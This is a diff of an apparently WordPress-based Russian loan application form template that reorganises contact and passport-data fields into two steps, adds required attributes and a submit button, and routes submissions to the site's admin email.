-                                            <li value="2002" label="2002" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2002
-                                            </li>
-                                            <li value="2001" label="2001" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2001
-                                            </li>
-                                            <li value="2000" label="2000" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                2000
-                                            </li>
-                                            <li value="1999" label="1999" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1999
-                                            </li>
-                                            <li value="1998" label="1998" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1998
-                                            </li>
-                                            <li value="1997" label="1997" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1997
-                                            </li>
-                                            <li value="1996" label="1996" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1996
-                                            </li>
-                                            <li value="1995" label="1995" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1995
-                                            </li>
-                                            <li value="1994" label="1994" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1994
-                                            </li>
-                                            <li value="1993" label="1993" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1993
-                                            </li>
-                                            <li value="1992" label="1992" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1992
-                                            </li>
-                                            <li value="1991" label="1991" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1991
-                                            </li>
-                                            <li value="1990" label="1990" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1990
-                                            </li>
-                                            <li value="1989" label="1989" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1989
-                                            </li>
-                                            <li value="1988" label="1988" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1988
-                                            </li>
-                                            <li value="1987" label="1987" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1987
-                                            </li>
-                                            <li value="1986" label="1986" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1986
-                                            </li>
-                                            <li value="1985" label="1985" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1985
-                                            </li>
-                                            <li value="1984" label="1984" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1984
-                                            </li>
-                                            <li value="1983" label="1983" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1983
-                                            </li>
-                                            <li value="1982" label="1982" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1982
-                                            </li>
-                                            <li value="1981" label="1981" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1981
-                                            </li>
-                                            <li value="1980" label="1980" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1980
-                                            </li>
-                                            <li value="1979" label="1979" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1979
-                                            </li>
-                                            <li value="1978" label="1978" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1978
-                                            </li>
-                                            <li value="1977" label="1977" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1977
-                                            </li>
-                                            <li value="1976" label="1976" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1976
-                                            </li>
-                                            <li value="1975" label="1975" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1975
-                                            </li>
-                                            <li value="1974" label="1974" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1974
-                                            </li>
-                                            <li value="1973" label="1973" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1973
-                                            </li>
-                                            <li value="1972" label="1972" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1972
-                                            </li>
-                                            <li value="1971" label="1971" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1971
-                                            </li>
-                                            <li value="1970" label="1970" class="Z96DE _3pzz9" data-test="ui-menu-item">
-                                                1970
+                                            <li onclick="select_creditSecurity_ul_kr_form('Под залог недвижимости')" value="SecuredByAvailableRealEstate" label="Под залог недвижимости"
+                                                class="Z96DE _3pzz9" data-test="ui-menu-item">Под залог недвижимости
                                             </li>
                                         </ul>
                                     </div>
                                 </div>
                             </div>
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
-                                                                                       for="monthlySalary">Ежемесячный
-                                        доход</label>
-                                    <div class="_3FIbJ"><input type="text" placeholder="Сумма" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="monthlySalary"
-                                                               name="monthlySalary" value=""></div>
-                                </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div data-test="ui-select" class="_1F9QS" id="creditSecurity-kr-form-wrap">
-                                    <div class="_31J-9 _3yuTA _16jhA" data-test="ui-select-input"><label
-                                                class="_1oupA _2IwHh" for="creditSecurity">Обеспечение кредита</label>
-                                        <div class="_3FIbJ ">
-                                            <input onclick="select_creditSecurity_kr_form()" autocomplete="off" autocorrect="off" autocapitalize="off"
-                                                 spellcheck="off" class="_1QIZ8 _3pwdR _1O6pC" id="creditSecurity"
-                                                 name="creditSecurity" placeholder="Выберите">
-                                            <div class="_390m1 _1sid2 _18XP_ pEdyv _2fl7k"
-                                                 data-test="ui-select-input-icon">
-                                                <svg class="_4fAE4">
-                                                    <use xlink:href="#arrow-down-thin"></use>
-                                                </svg>
+                            <div class="zWp9- _2mg0e">Контактные данные</div>
+                            <div class="_1CBZx _3nekq">
+                                <div class="_3ITGU">
+                                    <div class="_1uHjd" data-test="ui-ajax-suggest">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
+                                                        class="_1oupA _2IwHh" for="lastName">Фамилия</label>
+                                                <div class="_3FIbJ"><input required type="surname" data-focus-id="lastName"
+                                                                           display="where" direction="down"
+                                                                           autocomplete="off" autocorrect="off"
+                                                                           autocapitalize="off" spellcheck="off"
+                                                                           class="_1QIZ8 _3pwdR" role="input" id="lastName"
+                                                                           name="lastName" value=""></div>
                                             </div>
-                                        </div>
-                                    </div>
-                                    <ul class="_3nnad aDtzb" data-test="ui-select-values">
-                                        <li onclick="select_creditSecurity_ul_kr_form('Без обеспечения')" value="WithoutBail" label="Без обеспечения" class="Z96DE _3pzz9 _1kLbN"
-                                            data-test="ui-menu-item">Без обеспечения
-                                        </li>
-                                        <li onclick="select_creditSecurity_ul_kr_form('Под залог недвижимости')" value="SecuredByAvailableRealEstate" label="Под залог недвижимости"
-                                            class="Z96DE _3pzz9" data-test="ui-menu-item">Под залог недвижимости
-                                        </li>
-                                    </ul>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="zWp9- _2mg0e">Контактные данные</div>
-                        <div class="_1CBZx _3nekq">
-                            <div class="_3ITGU">
-                                <div class="_1uHjd" data-test="ui-ajax-suggest">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
-                                                    class="_1oupA _2IwHh" for="lastName">Фамилия</label>
-                                            <div class="_3FIbJ"><input type="surname" data-focus-id="lastName"
-                                                                       display="where" direction="down"
-                                                                       autocomplete="off" autocorrect="off"
-                                                                       autocapitalize="off" spellcheck="off"
-                                                                       class="_1QIZ8 _3pwdR" role="input" id="lastName"
-                                                                       name="lastName" value=""></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_1uHjd" data-test="ui-ajax-suggest">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
-                                                    class="_1oupA _2IwHh" for="firstName">Имя</label>
-                                            <div class="_3FIbJ"><input type="name" data-focus-id="firstName"
-                                                                       display="where" direction="down"
-                                                                       autocomplete="off" autocorrect="off"
-                                                                       autocapitalize="off" spellcheck="off"
-                                                                       class="_1QIZ8 _3pwdR" role="input" id="firstName"
-                                                                       name="firstName" value=""></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                <div class="_3ITGU">
+                                    <div class="_1uHjd" data-test="ui-ajax-suggest">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
+                                                        class="_1oupA _2IwHh" for="firstName">Имя</label>
+                                                <div class="_3FIbJ"><input required type="name" data-focus-id="firstName"
+                                                                           display="where" direction="down"
+                                                                           autocomplete="off" autocorrect="off"
+                                                                           autocapitalize="off" spellcheck="off"
+                                                                           class="_1QIZ8 _3pwdR" role="input" id="firstName"
+                                                                           name="firstName" value=""></div>
+                                            </div>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_1uHjd" data-test="ui-ajax-suggest">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
-                                                    class="_1oupA _2IwHh" for="surname">Отчество</label>
-                                            <div class="_3FIbJ"><input type="patronymic" data-focus-id="surname"
-                                                                       display="where" direction="down"
-                                                                       autocomplete="off" autocorrect="off"
-                                                                       autocapitalize="off" spellcheck="off"
-                                                                       class="_1QIZ8 _3pwdR" role="input" id="surname"
-                                                                       name="surname" value=""></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                <div class="_3ITGU">
+                                    <div class="_1uHjd" data-test="ui-ajax-suggest">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
+                                                        class="_1oupA _2IwHh" for="surname">Отчество</label>
+                                                <div class="_3FIbJ"><input required type="patronymic" data-focus-id="surname"
+                                                                           display="where" direction="down"
+                                                                           autocomplete="off" autocorrect="off"
+                                                                           autocapitalize="off" spellcheck="off"
+                                                                           class="_1QIZ8 _3pwdR" role="input" id="surname"
+                                                                           name="surname" value=""></div>
+                                            </div>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
-                                                                                       for="phone">Телефон для
-                                        связи</label>
-                                    <div class="_3FIbJ"><input type="tel" data-focus-id="phone" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="phone"
-                                                               name="phone" value=""></div>
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
+                                                                                           for="phone">Телефон для
+                                            связи</label>
+                                        <div class="_3FIbJ"><input required type="tel" data-focus-id="phone" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="phone"
+                                                                   name="phone" value=""></div>
+                                    </div>
                                 </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_1uHjd" data-test="ui-autocomplete">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-autocomplete-input"><label
-                                                    class="_1oupA _2IwHh" for="email">Электронная почта</label>
-                                            <div class="_3FIbJ"><input type="text" data-focus-id="email"
-                                                                       direction="down" autocomplete="off"
-                                                                       autocorrect="off" autocapitalize="off"
-                                                                       spellcheck="off" class="_1QIZ8 _3pwdR"
-                                                                       role="input" id="email" name="email"
-                                                                       value=""></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-autocomplete-suggestions"></ul>
+                                <div class="_3ITGU">
+                                    <div class="_1uHjd" data-test="ui-autocomplete">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-autocomplete-input"><label
+                                                        class="_1oupA _2IwHh" for="email">Электронная почта</label>
+                                                <div class="_3FIbJ"><input type="text" data-focus-id="email"
+                                                                           direction="down" autocomplete="off"
+                                                                           autocorrect="off" autocapitalize="off"
+                                                                           spellcheck="off" class="_1QIZ8 _3pwdR"
+                                                                           role="input" id="email" name="email"
+                                                                           value=""></div>
+                                            </div>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-autocomplete-suggestions"></ul>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            </div>
-                            <div class="_3ITGU _2ZoAD">
-                                <div>
-                                    <div class="_2s9kS _2Ygnf F2Di1" data-test="ui-checkbox-group">
-                                        <div class="VKYxY"><label class="_3Dnlt WpiwV" data-test="ui-checkbox"><input
-                                                        type="checkbox" class="_9wZ_m" name="agreement" value="true"
-                                                        readonly=""><span class="_2xGBH"><span><!-- react-text: 776 -->Согласен с
-                                                        <!-- /react-text --><a class="link">правилами предоставления информации</a></span></span></label>
-                                        </div>
-                                    </div><!-- react-empty: 778 --></div>
-                            </div>
-                        </div>
-                        <div class="_3yk02">
-                            <div class="Gbeui _8SYy5">
-                                <button class="_3yCMa _20Wee N0qHF _1-c8L" type="button" data-test="ui-button">
-                                    Продолжить
-                                </button>
-                            </div>
-                            <div class="Gbeui _1dym9">Для следующего шага подготовьте паспорт</div>
-                        </div>
-                    </div>
-                </div>
-
-
-
-
-
-
-
-
-
-                <div class="_1LQWv ER4_X">
-                    <div class="_1miZw _1rUOp">
-                        <div class="zWp9- _2mg0e">Паспортные данные</div>
-                        <div class="_2RJvL"><p>Ваши паспортные данные будут переданы в банк по защищённому каналу.</p>
-                            <p>Это необходимо для принятия решения о выдаче кредита.</p></div>
-                        <div class="_1CBZx _3nekq">
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
-                                                                                       for="birthDate">Дата
-                                        рождения</label>
-                                    <div class="_3FIbJ"><input type="text" data-focus-id="birthDate" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="birthDate"
-                                                               name="birthDate" value=""></div>
-                                </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_1uHjd" data-test="ui-ajax-suggest">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
-                                                    class="_1oupA _2IwHh" for="birthPlace">Место рождения</label>
-                                            <div class="_3FIbJ"><input type="text" data-focus-id="birthPlace"
-                                                                       display="where" direction="down"
-                                                                       autocomplete="off" autocorrect="off"
-                                                                       autocapitalize="off" spellcheck="off"
-                                                                       class="_1QIZ8 _3pwdR" role="input"
-                                                                       id="birthPlace" name="birthPlace" value=""></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                <div class="_3ITGU _2ZoAD _2ZoAD-rules">
+                                    <div>
+                                        <div class="_2s9kS _2Ygnf F2Di1" data-test="ui-checkbox-group">
+                                            <div class="VKYxY"><label class="_3Dnlt WpiwV" data-test="ui-checkbox"><input
+                                                            type="checkbox" class="_9wZ_m" name="agreement" value="true"
+                                                            readonly=""><span class="_2xGBH"><span><!-- react-text: 776 -->Согласен с
+                                                            <!-- /react-text --><a class="link">правилами предоставления информации</a></span></span></label>
                                             </div>
-                                        </div>
-                                    </div>
+                                        </div><!-- react-empty: 778 --></div>
                                 </div>
                             </div>
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh" for="sn">Номер
-                                        паспорта</label>
-                                    <div class="_3FIbJ"><input type="text" data-focus-id="sn" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="sn" name="sn"
-                                                               value=""></div>
+                            <div class="_3yk02">
+                                <div class="Gbeui _8SYy5">
+                                    <button class="_3yCMa _20Wee N0qHF _1-c8L form-first-part-button" type="button" data-test="ui-button">
+                                        Продолжить
+                                    </button>
                                 </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
-                                                                                       for="issueDate">Дата
-                                        выдачи</label>
-                                    <div class="_3FIbJ"><input type="text" data-focus-id="issueDate" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="issueDate"
-                                                               name="issueDate" value=""></div>
-                                </div>
-                            </div>
-                            <div class="_3ITGU">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh" for="code">Код
-                                        подразделения</label>
-                                    <div class="_3FIbJ"><input type="text" data-focus-id="code" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="code" name="code"
-                                                               value=""></div>
-                                </div>
-                            </div>
-                            <div class="_3ITGU _2ZoAD">
-                                <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
-                                                                                       for="issuer">Кем выдан</label>
-                                    <div class="_3FIbJ"><input type="text" data-focus-id="issuer" autocomplete="off"
-                                                               autocorrect="off" autocapitalize="off" spellcheck="off"
-                                                               class="_1QIZ8 _3pwdR" role="input" id="issuer"
-                                                               name="issuer"></div>
-                                </div>
-                            </div>
-                            <div class="_3ITGU _2ZoAD">
-                                <div class="_1uHjd" data-test="ui-ajax-suggest">
-                                    <div class="aJPK9">
-                                        <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
-                                                    class="_1oupA _2IwHh" for="address">Адрес регистрации (как в
-                                                паспорте)</label>
-                                            <div class="_3FIbJ"><input type="text" data-focus-id="address"
-                                                                       display="where" direction="down"
-                                                                       autocomplete="off" autocorrect="off"
-                                                                       autocapitalize="off" spellcheck="off"
-                                                                       class="_1QIZ8 _3pwdR" role="input" id="address"
-                                                                       name="address" value=""></div>
-                                        </div>
-                                        <div class="UfXw4">
-                                            <div class="">
-                                                <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="_3yk02">
-                            <div class="Gbeui _8SYy5">
-                                <button class="_3yCMa _20Wee N0qHF _1-c8L" type="button" data-test="ui-button">
-                                    Продолжить
-                                </button>
+                                <div class="Gbeui _1dym9">Для следующего шага подготовьте паспорт</div>
                             </div>
                         </div>
                     </div>
-                </div>
+
+
+
+
+
+
+
+
+
+                    <div class="_1LQWv ER4_X form-second-part">
+                        <div class="_1miZw _1rUOp">
+                            <div class="zWp9- _2mg0e">Паспортные данные</div>
+                            <div class="_2RJvL"><p>Ваши паспортные данные будут переданы в банк по защищённому каналу.</p>
+                                <p>Это необходимо для принятия решения о выдаче кредита.</p></div>
+                            <div class="_1CBZx _3nekq">
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
+                                                                                           for="birthDate">Дата
+                                            рождения</label>
+                                        <div class="_3FIbJ"><input required type="text" data-focus-id="birthDate" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="birthDate"
+                                                                   name="birthDate" value=""></div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_1uHjd" data-test="ui-ajax-suggest">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
+                                                        class="_1oupA _2IwHh" for="birthPlace">Место рождения</label>
+                                                <div class="_3FIbJ"><input required type="text" data-focus-id="birthPlace"
+                                                                           display="where" direction="down"
+                                                                           autocomplete="off" autocorrect="off"
+                                                                           autocapitalize="off" spellcheck="off"
+                                                                           class="_1QIZ8 _3pwdR" role="input"
+                                                                           id="birthPlace" name="birthPlace" value=""></div>
+                                            </div>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh" for="sn">Номер
+                                            паспорта</label>
+                                        <div class="_3FIbJ"><input required type="text" data-focus-id="sn" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="sn" name="sn"
+                                                                   value=""></div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
+                                                                                           for="issueDate">Дата
+                                            выдачи</label>
+                                        <div class="_3FIbJ"><input required type="text" data-focus-id="issueDate" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="issueDate"
+                                                                   name="issueDate" value=""></div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh" for="code">Код
+                                            подразделения</label>
+                                        <div class="_3FIbJ"><input required type="text" data-focus-id="code" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="code" name="code"
+                                                                   value=""></div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU _2ZoAD">
+                                    <div class="_31J-9 _16jhA" data-test="ui-input"><label class="_1oupA _2IwHh"
+                                                                                           for="issuer">Кем выдан</label>
+                                        <div class="_3FIbJ"><input required type="text" data-focus-id="issuer" autocomplete="off"
+                                                                   autocorrect="off" autocapitalize="off" spellcheck="off"
+                                                                   class="_1QIZ8 _3pwdR" role="input" id="issuer"
+                                                                   name="issuer"></div>
+                                    </div>
+                                </div>
+                                <div class="_3ITGU _2ZoAD">
+                                    <div class="_1uHjd" data-test="ui-ajax-suggest">
+                                        <div class="aJPK9">
+                                            <div class="_31J-9 _16jhA" data-test="ui-ajax-suggest-input"><label
+                                                        class="_1oupA _2IwHh" for="address">Адрес регистрации (как в
+                                                    паспорте)</label>
+                                                <div class="_3FIbJ"><input required type="text" data-focus-id="address"
+                                                                           display="where" direction="down"
+                                                                           autocomplete="off" autocorrect="off"
+                                                                           autocapitalize="off" spellcheck="off"
+                                                                           class="_1QIZ8 _3pwdR" role="input" id="address"
+                                                                           name="address" value=""></div>
+                                            </div>
+                                            <div class="UfXw4">
+                                                <div class="">
+                                                    <ul class="_3nnad _2Hwhb" data-test="ui-ajax-suggest-suggestions"></ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="_3yk02">
+                                <div class="Gbeui _8SYy5">
+                                    <input type="hidden" value="<?= get_bloginfo('admin_email'); ?>" name="sendto" required>
+                                    <input style="text-transform: none;" id="submit-static-form" class="_3yCMa _20Wee N0qHF _1-c8L" type="submit" data-test="ui-button" value="Отправить">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+
             </div>
         </div>
+
+        <script>
+            jQuery('.form-first-part-button').click(function () {
+                jQuery('.form-second-part').css('display', 'block');
+            })
+        </script>
+        <?php include_once "static-form-ajax.php" ?>
 
 
         <div class="va_block">
